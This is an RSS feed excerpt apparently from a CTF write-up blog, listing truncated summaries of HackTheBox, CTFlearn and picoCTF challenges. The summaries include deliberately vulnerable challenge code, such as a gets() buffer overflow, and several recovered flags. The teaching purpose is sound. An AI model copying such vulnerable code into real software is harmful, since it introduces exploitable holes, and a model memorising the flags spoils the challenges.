airplane automobile bird cat deer dog frog horse ship truck The classification is handled with a Machine Learning algorithm (using tensorflow). We are also given the model (sigmanet.</description></item><item><title>signup</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/signup/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/signup/</guid><description>We are given the Python source code to encrypt the flag (app.py):
from Crypto.Util.number import getPrime, getRandomRange, isPrime, inverse, long_to_bytes, bytes_to_long from hashlib import sha512 from random import SystemRandom from FLAG import flag L = 2048 N = 256 def repeating_xor_key(message, key): repeation = 1 + (len(message) // len(key)) key = key * repeation key = key[:len(message)] msg = bytes([c ^ k for c, k in zip(message, key)]) return msg def domain_params_generation(): q = getPrime(N) print(f"</description></item><item><title>Simple bof</title><link>https://7rocky.github.io/en/ctf/ctflearn/binary/simple-bof/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/binary/simple-bof/</guid><description>We have the C source code of a binary and a remote instance to connect to. Basically, what the program does is call function gets, which is vulnerable to Buffer Overflow, and then compare a local variable with a certain value:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; // Defined in a separate source file for simplicity. void init_visualize(char* buff); void visualize(char* buff); void safeguard(); void print_flag(); void vuln() { char padding[16]; char buff[32]; int notsecret = 0xffffff00; int secret = 0xdeadbeef; memset(buff, 0, sizeof(buff)); // Zero-out the buffer.</description></item><item><title>Simple Programming</title><link>https://7rocky.github.io/en/ctf/ctflearn/programming/simple-programming/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/programming/simple-programming/</guid><description>We are given a file called data.dat and we are told to count every line that has a number of 0 that is multiple of 3 or that has a number of 1 that is a multiple of 2.
We can take a look at the first lines of the file:
$ head data.dat 0001100000101010100 110101000001111 101100011001110111 0111111010100 1010111111100011 1110011110010110 11100101010110111 10101101011 1111011101001 0001110001 Alright. The idea is to iterate the file on each line and add 1 to a counter (initialized with 0) if the condition is satisfied.</description></item><item><title>Situated</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/situated/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/situated/</guid><description>We are given this website (https://eth007.me/blog/about/):
Since the description of the challenge is
Can you see beyond what&amp;rsquo;s visible?
we might think inspecting the HTML source code of the website. And there we have a strange img source:
Flag And it is indeed the flag (in URL encoding, %7B is { and %7D is }):
$ curl -s https://eth007.me/blog/about/ | grep ictf &amp;lt;p&amp;gt;&amp;lt;img src="ictf%7Binsp3cting_my_site?_h0w??%7D" alt=""&amp;gt;&amp;lt;/p&amp;gt;</description></item><item><title>Slippy</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/slippy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/slippy/</guid><description>We have a simple web back-end that allows us to upload a .tar.gz file. As we have a Dockerfile, let&amp;rsquo;s use a Docker container locally:
Source code analysis On the source code we have a simple Python Flask application:
@api.route('/unslippy', methods=['POST']) def cache(): if 'file' not in request.files: return abort(400) extraction = extract_from_archive(request.files['file']) if extraction: return {'list': extraction}, 200 return '', 204 The file is being extracted and written to /tmp:</description></item><item><title>Small StEps</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/small-steps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/small-steps/</guid><description>We are given a remote instance to connect to:
$ nc 188.166.152.84 32213 This is the second level of training. [E]ncrypt the flag. [A]bort training. &amp;gt; We are also provided with the server&amp;rsquo;s Python source code:
from Crypto.Util.number import getPrime, bytes_to_long FLAG = b"HTB{???????????????}" assert len(FLAG) == 20 class RSA: def __init__(self): self.q = getPrime(256) self.p = getPrime(256) self.n = self.q * self.p self.e = 3 def encrypt(self, plaintext): plaintext = bytes_to_long(plaintext) return pow(plaintext, self.</description></item><item><title>Snakecode</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/snakecode/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/snakecode/</guid><description>We are given a binary file called chall.pyc, so we know it is a binary compiled using Python:
$ file chall.pyc chall.pyc: python 2.7 byte-compiled First of all, we can extract the Python source code using uncompyle6. Since it is compiled with python2.7, we can use a Docker container for that purpose:
$ docker run -v "$PWD":/ctf -it python:2.7 bash root@11d1f884672f:~# cd /ctf root@11d1f884672f:/ctf# pip install uncompyle6 DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020.</description></item><item><title>Snowboard</title><link>https://7rocky.github.io/en/ctf/ctflearn/forensics/snowboard/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/forensics/snowboard/</guid><description>We are told to find the flag in this image:
However, the flag is not visible inside the image and it is not hidden in its content. However, we can find the flag in the file raw content.
In order to extract printable characters from the image we can use strings and take the first values with head:
$ strings snowboard.jpg | head JFIF CTFlearn{CTFIsEasy!!!} Q1RGbGVhcm57U2tpQmFuZmZ9Cg== Exif Canon Canon EOS 6D Mark II GIMP 2.</description></item><item><title>So many 64s</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/so-many-64s/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/so-many-64s/</guid><description>We are given a pretty large file:
 Looking at the characters and the name of the challenge, we can guess that it is the result of encoding a certain string multiple times in Base64.
Since there are a lot of encoding processes, we can use a loop in Bash until we find the flag in plain text:
$ f=$(cat flag.txt); while true; do if [[ $f = CTFlearn* ]]; then echo $f; break; fi; f=$(echo $f | base64 -d); done CTFlearn{pr3tty_b4s1c_r1ght?</description></item><item><title>Sound of Silence</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/sound-of-silence/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/sound-of-silence/</guid><description>We are given a 64-bit binary called sound_of_silence:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) We also have the remote Glibc library and loader:
$ glibc/ld-linux-x86-64.so.2 glibc/libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.4) stable release version 2.35. Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Space</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/space/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/space/</guid><description>We are given a 32-bit binary called space:
Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments It has no protections, so we can potentially run custom shellcode on the stack if we exploit a Buffer Overflow vulnerability.
Buffer Overflow vulnerability If we execute the binary, we have only a prompt to enter data, and then exit:
$ ./space > A $ .</description></item><item><title>Space pirate: Entrypoint</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-entrypoint/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-entrypoint/</guid><description>We are given a 64-bit binary called sp_entrypoint:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' We can run it to view two options:
$ ./sp_entrypoint Authentication System ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░▒▓▓▓░░▓▓▓▓▓ ░ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓▒░▓▓▓▓▓ ░ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▒░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒░░░▓▓░░░▓▓▒░ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒░░░▒▓▓░░░▓▓▒ ░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░░░░░▓▓░░░▓▓▓ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░▓▓▓▒░░░░▓▓▒ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░▒░░░▓▓░ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓░▒▓▓▓░░░░░▓▓░ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒░▓▓▓░░░░ ▓▓ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 1.</description></item><item><title>Space pirate: Going Deeper</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-going-deeper/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-going-deeper/</guid><description>We are given a 64-bit binary called sp_going_deeper:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' If we run it, we will see three options:
$ ./sp_going_deeper Trying to leak information from the pc.. 🖥️ ____________________________________________________ / \ | _____________________________________________ | | | | | | | goldenfang@d12:$ history | | | | 1 ls | | | | 2 mv secret_pass.</description></item><item><title>Space pirate: Retribution</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-retribution/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-retribution/</guid><description>We are given a 64-bit binary called sp_retribution:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Reverse engineering If we open the binary in Ghidra we will see this main function:
void main() { char local_b[3]; setup(); banner(); while (true) { while (true) { printf(&amp;amp;DAT_00101f68, &amp;amp;DAT_00100d78); read(0, local_b, 2); if (local_b[0] != '1') break; show_missiles(); } if (local_b[0] != '2') break; missile_launcher(); } printf("</description></item><item><title>Space Pirates</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/space-pirates/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/space-pirates/</guid><description>We are given this Python source code:
from sympy import * from hashlib import md5 from Crypto.Cipher import AES from Crypto.Util.Padding import pad from random import randint, randbytes, seed FLAG = b'HTB{dummyflag}' class Shamir: def __init__(self, prime, k, n): self.p = prime self.secret = randint(1, self.p - 1) self.k = k self.n = n self.coeffs = [self.secret] self.x_vals = [] self.y_vals = [] def next_coeff(self, val): return int(md5(val.to_bytes(32, byteorder='big')).hexdigest(), 16) def calc_coeffs(self): for i in range(1, self.</description></item><item><title>Spellbook</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/spellbook/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/spellbook/</guid><description>We are given a 64-bit binary called spellbook:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Reverse engineering If we open the binary in Ghidra, we will see this decompiled C source code for the main function:
void main() { size_t option; setup(); banner(); while (true) { while (true) { while (option = menu(), option == 2) { show(); } if (option &amp;lt; 3) break; if (option == 3) { edit(); } else { if (option !</description></item><item><title>Spellbook</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/spellbook/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/spellbook/</guid><description>We are given a 64-bit binary called spellbook:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Reverse engineering If we open the binary in Ghidra, we will see this decompiled C source code for the main function:
void main() { size_t option; setup(); banner(); while (true) { while (true) { while (option = menu(), option == 2) { show(); } if (option &amp;lt; 3) break; if (option == 3) { edit(); } else { if (option !</description></item><item><title>Spellbound Servants</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/spellbound-servants/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/spellbound-servants/</guid><description>We are given the following website:
We also have the Python source code of the server (Flask).
First of all, we can register a new account and log in:
And we get to this dashboard:
There is no funcionality! So, let&amp;rsquo;s analyze the source code.
Source code analysis These are the available endpoints (blueprints/routes.py):
from application.database import * from flask import Blueprint, redirect, render_template, request, make_response from application.util import response, isAuthenticated web = Blueprint('web', __name__) api = Blueprint('api', __name__) @web.</description></item><item><title>SpellBrewery</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/spellbrewery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/spellbrewery/</guid><description>We are given the following files:
$ file * SpellBrewery: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0ee68cb419f7329a3bd027c947654385d416143a, not stripped SpellBrewery.deps.json: JSON data SpellBrewery.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows SpellBrewery.runtimeconfig.json: JSON data There is an ELF binary and a Windows DLL. If we look at the strings of the binary, we will see that it loads the DLL:</description></item><item><title>SPG</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/spg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/spg/</guid><description>We are given the Python source code used to encrypt the flag:
from hashlib import sha256 import string, random from secret import MASTER_KEY, FLAG from Crypto.Cipher import AES from Crypto.Util.Padding import pad from base64 import b64encode ALPHABET = string.ascii_letters + string.digits + '~!@#$%^&amp;amp;*' def generate_password(): master_key = int.from_bytes(MASTER_KEY, 'little') password = '' while master_key: bit = master_key &amp;amp; 1 if bit: password += random.choice(ALPHABET[:len(ALPHABET)//2]) else: password += random.choice(ALPHABET[len(ALPHABET)//2:]) master_key &amp;gt;&amp;gt;= 1 return password def main(): password = generate_password() encryption_key = sha256(MASTER_KEY).</description></item><item><title>Spiky Tamagotchi</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/spiky-tamagotchi/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/spiky-tamagotchi/</guid><description>We are given the source code of a Node.js web project using Express JS and MySQL.
Source code analysis In the Dockerfile an entrypoint.sh script is run:
#!/bin/ash # Secure entrypoint chmod 600 /entrypoint.sh # Initialize &amp;amp; Start MariaDB mkdir -p /run/mysqld chown -R mysql:mysql /run/mysqld mysql_install_db --user=mysql --ldata=/var/lib/mysql mysqld --user=mysql --console --skip-name-resolve --skip-networking=0 &amp;amp; # Wait for mysql to start while ! mysqladmin ping -h'localhost' --silent; do echo "mysqld is not yet alive"</description></item><item><title>Spookifier</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/spookifier/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/spookifier/</guid><description>We are given this website:
We can enter some string and it will be shown in different fonts:
Static code analysis We are provided with the Python source code of the web application, built with Flask. This is application/blueprints/routes.py:
from flask import Blueprint, request from flask_mako import render_template from application.util import spookify web = Blueprint('web', __name__) @web.route('/') def index(): text = request.args.get('text') if text: converted = spookify(text) return render_template('index.html', output=converted) return render_template('index.</description></item><item><title>Spookifier</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/spookifier/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/spookifier/</guid><description>We are given this website:
We can enter some string and it will be shown in different fonts:
Static code analysis We are provided with the Python source code of the web application, built with Flask. This is application/blueprints/routes.py:
from flask import Blueprint, request from flask_mako import render_template from application.util import spookify web = Blueprint('web', __name__) @web.route('/') def index(): text = request.args.get('text') if text: converted = spookify(text) return render_template('index.html', output=converted) return render_template('index.</description></item><item><title>SpookTastic</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/spooktastic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/spooktastic/</guid><description>We are given the following website:
We also have the Python source code of the server (Flask).
Source code analysis The relevant file is app.py:
import random, string from flask import Flask, request, render_template, abort from flask_socketio import SocketIO from threading import Thread app = Flask(__name__) socketio = SocketIO(app) registered_emails, socket_clients = [], {} generate = lambda x: "".join([random.choice(string.hexdigits) for _ in range(x)]) BOT_TOKEN = generate(16) def blacklist_pass(email): email = email.</description></item><item><title>Spooky RSA</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/spooky-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/spooky-rsa/</guid><description>We got the Python source code used to encrypt the flag:
from Crypto.Util.number import bytes_to_long, getStrongPrime from random import randint FLAG = b'HTB{????????????????????????????????????????????}' def key_gen(bits): p, q = getStrongPrime(bits), getStrongPrime(bits) N = p * q return N, (p, q) def encrypt(m, N, f): e1, e2 = randint(2, N - 2), randint(2, N - 2) c1 = (pow(f, e1, N) + m) % N c2 = (pow(f, e2, N) + m) % N return (e1, c1), (e2, c2) def main(): N, priv = key_gen(1024) m = bytes_to_long(FLAG) (e1, c1), (e2, c2) = encrypt(m, N, priv[0]) with open('out.</description></item><item><title>Spooky RSA</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/spooky-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/spooky-rsa/</guid><description>We got the Python source code used to encrypt the flag:
from Crypto.Util.number import bytes_to_long, getStrongPrime from random import randint FLAG = b'HTB{????????????????????????????????????????????}' def key_gen(bits): p, q = getStrongPrime(bits), getStrongPrime(bits) N = p * q return N, (p, q) def encrypt(m, N, f): e1, e2 = randint(2, N - 2), randint(2, N - 2) c1 = (pow(f, e1, N) + m) % N c2 = (pow(f, e2, N) + m) % N return (e1, c1), (e2, c2) def main(): N, priv = key_gen(1024) m = bytes_to_long(FLAG) (e1, c1), (e2, c2) = encrypt(m, N, priv[0]) with open('out.</description></item><item><title>Spooky Safebox</title><link>https://7rocky.github.io/en/ctf/other/hack.lu-ctf/spooky-safebox/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hack.lu-ctf/spooky-safebox/</guid><description>We are given source code of the server in Python. This is app.py:
#!/usr/bin/env python3 import secrets import os, sys, hmac import cryptod from proofofwork import challenge_proof_of_work FLAG = os.environ.get("FLAG", "flag{FAKE_FLAG}") if "flag" in os.environ.get("FLAG","") else "flag{FAKE_FLAG}" def main(): print("Welcome to the Spooky Safebox!") if not challenge_proof_of_work(): return kpriv, kpub = cryptod.make_keys() order = cryptod.get_order() encrypted_flag = cryptod.encrypt(kpub, FLAG) print("Here is the encrypted flag:", encrypted_flag) print("You've got 9 signatures, try to recover Satoshi's private key!</description></item><item><title>Spooky Time</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/spooky-time/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/spooky-time/</guid><description>We are given a 64-bit binary called spooky_time:
Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Reverse engineering If we open the binary in Ghidra we will see this main function:
void main() { long in_FS_OFFSET; char first_input[12]; char second_input[312]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setup(); banner(); puts("It\'s your chance to scare those little kids, say something scary!\n"); __isoc99_scanf("</description></item><item><title>Spooky Time</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/spooky-time/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/spooky-time/</guid><description>We are given a 64-bit binary called spooky_time:
Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Reverse engineering If we open the binary in Ghidra we will see this main function:
void main() { long in_FS_OFFSET; char first_input[12]; char second_input[312]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setup(); banner(); puts("It\'s your chance to scare those little kids, say something scary!\n"); __isoc99_scanf("</description></item><item><title>Spybug</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/spybug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/spybug/</guid><description>We are given a website like this:
We also have the source code of the web application in Node.js and the source code of an agent in Go.
Source code analysis The web application is built with Express JS. In index.js we can see a Content Security Policy (CSP) header and a function visitPanel that runs every minute:
application.use((req, res, next) =&amp;gt; { res.setHeader("Content-Security-Policy", "script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';"</description></item><item><title>SpyBug</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/spybug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/spybug/</guid><description>We are given a website like this:
We also have the source code of the web application in Node.js and the source code of an agent in Go.
Source code analysis The web application is built with Express JS. In index.js we can see a Content Security Policy (CSP) header and a function visitPanel that runs every minute:
application.use((req, res, next) =&amp;gt; { res.setHeader("Content-Security-Policy", "script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';"</description></item><item><title>St3g0</title><link>https://7rocky.github.io/en/ctf/picoctf/forensics/st3g0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/forensics/st3g0/</guid><description>We have a PNG image called pico.flag.png:
Since the challenge name is St3g0, it seems that the image has hidden data using steganography. We can use zsteg to show the flag:
